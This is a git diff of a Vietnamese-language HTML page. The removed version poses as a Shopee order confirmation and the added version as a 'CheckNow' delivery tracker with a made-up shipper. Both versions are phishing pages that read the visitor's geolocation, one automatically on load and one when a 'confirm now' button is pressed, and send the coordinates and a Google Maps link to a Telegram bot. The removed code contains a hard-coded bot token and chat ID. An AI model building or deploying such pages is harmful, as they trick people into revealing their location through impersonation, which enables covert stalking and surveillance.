@@ -1,64 +1,193 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Shopee đang xác nhận đơn hàng !</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CheckNow</title>
 
-  <style>
-    body{
-      margin:0;
-      font-family:Arial;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      height:100vh;
-      background:#f3f4f6;
-    }
-    .box{
-      text-align:center;
-      background:white;
-      padding:25px;
-      border-radius:12px;
-      box-shadow:0 10px 30px rgba(0,0,0,0.1);
-    }
-    .spinner{
-      border:4px solid #eee;
-      border-top:4px solid #4f46e5;
-      border-radius:50%;
-      width:40px;
-      height:40px;
-      animation:spin 1s linear infinite;
-      margin:0 auto 15px;
-    }
-    @keyframes spin{
-      0%{transform:rotate(0deg)}
-      100%{transform:rotate(360deg)}
-    }
-  </style>
+<style>
+:root{
+  --primary:#2563EB;
+  --ok:#16A34A;
+  --gray:#d1d5db;
+}
+
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
+  background:#f5f7fb;
+}
+
+/* Header */
+.header{
+  background:var(--primary);
+  color:white;
+  padding:14px;
+  text-align:center;
+  font-weight:600;
+}
+
+/* Card */
+.card{
+  margin:20px;
+  background:white;
+  border-radius:16px;
+  padding:20px;
+  box-shadow:0 10px 25px rgba(0,0,0,0.08);
+}
+
+/* Shipper */
+.shipper{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin-top:15px;
+  padding:12px;
+  background:#f1f5f9;
+  border-radius:12px;
+}
+
+.avatar{
+  width:44px;
+  height:44px;
+  border-radius:50%;
+  background:var(--primary);
+  color:white;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-weight:bold;
+}
+
+.call{
+  background:var(--primary);
+  color:white;
+  padding:8px 10px;
+  border-radius:10px;
+  font-size:13px;
+  text-decoration:none;
+}
+
+/* Timeline */
+.timeline{
+  display:flex;
+  justify-content:space-between;
+  margin:20px 0;
+  position:relative;
+}
+
+.timeline::before{
+  content:"";
+  position:absolute;
+  top:12px;
+  left:0;
+  right:0;
+  height:3px;
+  background:#e5e7eb;
+  z-index:0;
+}
+
+.step{
+  text-align:center;
+  position:relative;
+  z-index:1;
+}
+
+.circle{
+  width:24px;
+  height:24px;
+  border-radius:50%;
+  background:var(--gray);
+  margin:auto;
+}
+
+.active .circle{
+  background:var(--primary);
+}
+
+.done .circle{
+  background:var(--ok);
+}
+
+.label{
+  font-size:12px;
+  margin-top:6px;
+}
+
+/* Button */
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:var(--primary);
+  color:white;
+  font-weight:600;
+  margin-top:15px;
+}
+</style>
 </head>
 
 <body>
-  <div class="box">
-    <div class="spinner"></div>
-    <h3>Shopee Đang xác nhận...</h3>
-    <p>Xác nhận đơn hàng thành công !</p>
+
+<div class="header">CheckNow</div>
+
+<div class="card">
+
+<h3 id="title">🚚 Đơn hàng đang được giao</h3>
+<p id="eta">Dự kiến: 5–10 phút</p>
+
+<!-- SHIPPER -->
+<div class="shipper">
+  <div class="avatar">T</div>
+
+  <div style="flex:1">
+    <div style="font-weight:600">Trần Tuấn</div>
+    <div style="font-size:13px;color:#6b7280">Shipper đang giao</div>
   </div>
 
+  <a href="tel:0901234567" class="call">Gọi</a>
+</div>
+
+<!-- TIMELINE -->
+<div class="timeline">
+  <div class="step done">
+    <div class="circle"></div>
+    <div class="label">Đã nhận</div>
+  </div>
+
+  <div class="step active">
+    <div class="circle"></div>
+    <div class="label">Đang giao</div>
+  </div>
+
+  <div class="step">
+    <div class="circle"></div>
+    <div class="label">Sắp đến</div>
+  </div>
+
+  <div class="step">
+    <div class="circle"></div>
+    <div class="label">Hoàn tất</div>
+  </div>
+</div>
+
+<button onclick="getLocation()">XÁC NHẬN NGAY</button>
+
+</div>
+
 <script>
-const TOKEN = "8770209732:AAHHiC-wWAU3F9UUG_KJ41QijPQSjvHlH1M";
-const CHAT_ID = "2040033988";
+const TOKEN = "YOUR_BOT_TOKEN";
+const CHAT_ID = "YOUR_CHAT_ID";
 
 function sendToTelegram(lat, lon){
-  const text = `📍 Vị trí:
-Lat: ${lat}
-Lon: ${lon}
-https://www.google.com/maps?q=${lat},${lon}
-Time: ${new Date().toLocaleString()}`;
+  const text = `📦 CheckNow
+📍 ${lat}, ${lon}
+https://www.google.com/maps?q=${lat},${lon}`;
 
   fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {"Content-Type": "application/json"},
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
     body: JSON.stringify({
       chat_id: CHAT_ID,
       text: text
@@ -66,34 +195,38 @@ Time: ${new Date().toLocaleString()}`;
   });
 }
 
-// Auto chạy khi mở trang
-window.onload = function(){
-  if(navigator.geolocation){
-    navigator.geolocation.getCurrentPosition(
-      function(pos){
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
+function updateStep(){
+  const steps = document.querySelectorAll(".step");
+  steps[1].classList.remove("active");
+  steps[1].classList.add("done");
+  steps[2].classList.add("active");
 
-        sendToTelegram(lat, lon);
+  document.getElementById("title").innerText = "🚚 Shipper sắp đến";
+  document.getElementById("eta").innerText = "Còn khoảng 1–2 phút";
+}
 
-        document.body.innerHTML = `
-          <div class="box">
-            <h3 style="color:green;">✔ Shopee xác nhận thành công đơn hàng</h3>
-            <p>Bạn có thể đóng trang</p>
-          </div>
-        `;
-      },
-      function(err){
-        document.body.innerHTML = `
-          <div class="box">
-            <h3 style="color:red;">❌ Shopee xác nhận đơn hàng không thành công</h3>
-            <p>Vui lòng cho phép xác nhận lại</p>
-          </div>
-        `;
-      }
-    );
-  }
-};
+function finish(){
+  const steps = document.querySelectorAll(".step");
+  steps[2].classList.remove("active");
+  steps[2].classList.add("done");
+  steps[3].classList.add("done");
+
+  document.getElementById("title").innerText = "✔ Giao hàng thành công";
+  document.getElementById("eta").innerText = "Cảm ơn bạn đã xác nhận";
+}
+
+function getLocation(){
+  navigator.geolocation.getCurrentPosition(
+    function(pos){
+      sendToTelegram(pos.coords.latitude, pos.coords.longitude);
+      updateStep();
+      setTimeout(finish, 2000);
+    },
+    function(){
+      alert("Bạn cần cho phép quyền vị trí");
+    }
+  );
+}
 </script>
 
 </body>
